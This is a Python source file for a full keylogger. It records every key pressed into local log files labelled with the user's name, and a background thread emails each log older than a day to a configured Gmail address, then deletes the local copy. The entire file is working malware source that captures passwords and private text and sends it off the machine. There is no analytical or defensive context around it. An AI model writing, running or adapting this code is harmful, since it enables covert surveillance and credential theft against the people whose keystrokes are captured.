import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import requests
import time
import keyboard
import datetime
import threading
import sys
import getpass

EMAIL_CONFIG = {
    'email': 'your-email@gmail.com',
    'password': 'your-app-password',
    'recipient_email': 'your-email@gmail.com',
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587
}

MAX_FILE_AGE = 86400
CHECK_INTERVAL = 3600
RETRY_INTERVAL = 300
LOG_PREFIX = "data"
LOG_SUFFIX = ".txt"

current_file = None
file_creation_time = None
file_counter = 1
pending_files = []

def get_current_script_directory():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.realpath(__file__))

def get_username():
    try:
        return getpass.getuser()
    except:
        return "Unknown User"

def get_next_file_number():
    global file_counter
    current_script_directory = get_current_script_directory()
    
    max_number = 0
    for file in os.listdir(current_script_directory):
        if file.startswith(LOG_PREFIX) and file.endswith(LOG_SUFFIX):
            try:
                number_str = file[len(LOG_PREFIX):-len(LOG_SUFFIX)]
                if number_str.isdigit():
                    number = int(number_str)
                    if number > max_number:
                        max_number = number
            except:
                continue
    
    next_number = max_number + 1
    file_counter = next_number
    return next_number

def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=10)
        return True
    except (requests.ConnectionError, requests.Timeout):
        return False

def send_email(subject, message, to_email, attachment_path, email, password):
    try:
        for attempt in range(3):
            try:
                server = smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port'])
                server.starttls()
                server.login(email, password)

                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = to_email
                msg['Subject'] = subject
                msg.attach(MIMEText(message, 'plain'))

                with open(attachment_path, 'rb') as file:
                    part = MIMEApplication(file.read(), Name=os.path.basename(attachment_path))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
                msg.attach(part)

                server.sendmail(email, to_email, msg.as_string())
                server.quit()
                
                print(f"Email sent successfully to {to_email} (attempt {attempt + 1})")
                return True
                
            except (smtplib.SMTPException, ConnectionError) as e:
                print(f"Email attempt {attempt + 1} failed: {e}")
                if attempt < 2:
                    time.sleep(10)
                continue
                
    except Exception as e:
        print(f"Error sending email: {e}")
    
    return False

def create_new_file():
    global current_file, file_creation_time
    
    current_script_directory = get_current_script_directory()
    file_number = get_next_file_number()
    filename = f"{LOG_PREFIX}{file_number}{LOG_SUFFIX}"
    filepath = os.path.join(current_script_directory, filename)
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(f"=== KEYLOGGER STARTED ===\n")
        f.write(f"Start Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"User: {get_username()}\n")
        f.write(f"File: {filename}\n")
        f.write("=" * 40 + "\n\n")
    
    current_file = filepath
    file_creation_time = time.time()
    print(f"Created new file: {filename}")
    return filepath

def scan_pending_files():
    global pending_files
    current_script_directory = get_current_script_directory()
    pending_files = []
    
    for file in os.listdir(current_script_directory):
        if file.startswith(LOG_PREFIX) and file.endswith(LOG_SUFFIX):
            filepath = os.path.join(current_script_directory, file)
            file_age = time.time() - os.path.getctime(filepath)
            
            if file_age >= MAX_FILE_AGE:
                pending_files.append(filepath)
                print(f"Found pending file: {file} (age: {file_age//3600:.1f}h)")
    
    return pending_files

def get_current_file():
    global current_file, file_creation_time, pending_files
    
    current_script_directory = get_current_script_directory()
    
    scan_pending_files()
    
    max_number = 0
    latest_file = None
    for file in os.listdir(current_script_directory):
        if file.startswith(LOG_PREFIX) and file.endswith(LOG_SUFFIX):
            try:
                number_str = file[len(LOG_PREFIX):-len(LOG_SUFFIX)]
                if number_str.isdigit():
                    number = int(number_str)
                    if number > max_number:
                        max_number = number
                        latest_file = file
            except:
                continue
    
    if latest_file:
        filepath = os.path.join(current_script_directory, latest_file)
        current_file = filepath
        file_creation_time = os.path.getctime(filepath)
        
        current_time = time.time()
        file_age = current_time - file_creation_time
        
        if file_age >= MAX_FILE_AGE and check_internet_connection():
            print(f"File {latest_file} is older than 24 hours. Attempting to send...")
            add_end_time_to_file(filepath)
            
            success = send_email(
                f'Keylogger Data Report - {latest_file}', 
                f'Keylogger data collected from {datetime.datetime.fromtimestamp(file_creation_time).strftime("%Y-%m-%d %H:%M:%S")} to {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.\nUser: {get_username()}',
                EMAIL_CONFIG['recipient_email'], 
                filepath, 
                EMAIL_CONFIG['email'], 
                EMAIL_CONFIG['password']
            )
            
            if success:
                os.remove(filepath)
                print(f"File {latest_file} sent and deleted.")
                return create_new_file()
            else:
                print(f"Failed to send {latest_file}, will retry later.")
                if filepath not in pending_files:
                    pending_files.append(filepath)
        
        print(f"Using existing file: {latest_file}")
        return filepath
    else:
        return create_new_file()

def add_end_time_to_file(filepath):
    if os.path.exists(filepath):
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(f"\n" + "=" * 40 + "\n")
            f.write(f"End Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"User: {get_username()}\n")
            f.write(f"=== KEYLOGGER ENDED ===\n")

def file_checker():
    global current_file, file_creation_time, pending_files
    
    while True:
        has_internet = check_internet_connection()
        
        if has_internet:
            if pending_files:
                print(f"Found {len(pending_files)} pending files. Sending now...")
                successful_sends = []
                
                for filepath in pending_files[:]:
                    if os.path.exists(filepath):
                        print(f"Sending pending file: {os.path.basename(filepath)}")
                        
                        success = send_email(
                            f'Keylogger Data Report - {os.path.basename(filepath)}', 
                            f'[PENDING] Keylogger data - {os.path.basename(filepath)}\nUser: {get_username()}',
                            EMAIL_CONFIG['recipient_email'], 
                            filepath, 
                            EMAIL_CONFIG['email'], 
                            EMAIL_CONFIG['password']
                        )
                        
                        if success:
                            os.remove(filepath)
                            successful_sends.append(filepath)
                            print(f"Pending file {os.path.basename(filepath)} sent and deleted.")
                        else:
                            print(f"Failed to send pending file {os.path.basename(filepath)}")
                
                for filepath in successful_sends:
                    if filepath in pending_files:
                        pending_files.remove(filepath)
                    if filepath == current_file:
                        current_file = create_new_file()
            
            if current_file and os.path.exists(current_file):
                current_time = time.time()
                file_age = current_time - file_creation_time
                
                if file_age >= MAX_FILE_AGE:
                    print(f"Current file is {file_age//3600:.1f} hours old. Sending...")
                    
                    add_end_time_to_file(current_file)
                    
                    success = send_email(
                        f'Keylogger Data Report - {os.path.basename(current_file)}', 
                        f'Keylogger data collected from {datetime.datetime.fromtimestamp(file_creation_time).strftime("%Y-%m-%d %H:%M:%S")} to {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.\nUser: {get_username()}',
                        EMAIL_CONFIG['recipient_email'], 
                        current_file, 
                        EMAIL_CONFIG['email'], 
                        EMAIL_CONFIG['password']
                    )
                    
                    if success:
                        old_file = current_file
                        create_new_file()
                        os.remove(old_file)
                        print(f"File {os.path.basename(old_file)} sent and deleted.")
                    else:
                        print(f"Failed to send current file, will retry later.")
                        if current_file not in pending_files:
                            pending_files.append(current_file)
            
            time.sleep(CHECK_INTERVAL)
            
        else:
            print(f"No internet connection. Retrying in {RETRY_INTERVAL//60} minutes...")
            time.sleep(RETRY_INTERVAL)

def on_key_event(event):
    global current_file
    
    current_file_path = get_current_file()
    key = event.name
    
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "backspace":
            key = "[BACKSPACE]"
        elif key == "tab":
            key = "[TAB]"
        else:
            key = "[" + key + "]"
    
    with open(current_file_path, "a", encoding="utf-8") as f:
        f.write(key)

def keylogger():
    print("Keylogger started...")
    get_current_file()
    keyboard.on_release(callback=on_key_event)
    
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("Keylogger stopped.")

def main():
    print("Starting keylogger with enhanced offline handling...")
    print("Press Ctrl+C to stop the program.")
    
    print(f"Email: {EMAIL_CONFIG['email']}")
    print(f"Recipient: {EMAIL_CONFIG['recipient_email']}")
    print(f"Max file age: {MAX_FILE_AGE//3600} hours")
    print(f"Check interval: {CHECK_INTERVAL//3600} hours (online)")
    print(f"Retry interval: {RETRY_INTERVAL//60} minutes (offline)")
    print(f"Current User: {get_username()}")
    
    keylogger_thread = threading.Thread(target=keylogger)
    file_checker_thread = threading.Thread(target=file_checker)
    
    keylogger_thread.daemon = True
    file_checker_thread.daemon = True
    
    keylogger_thread.start()
    file_checker_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping program...")
        print("Program stopped.")

if __name__ == "__main__":
    main()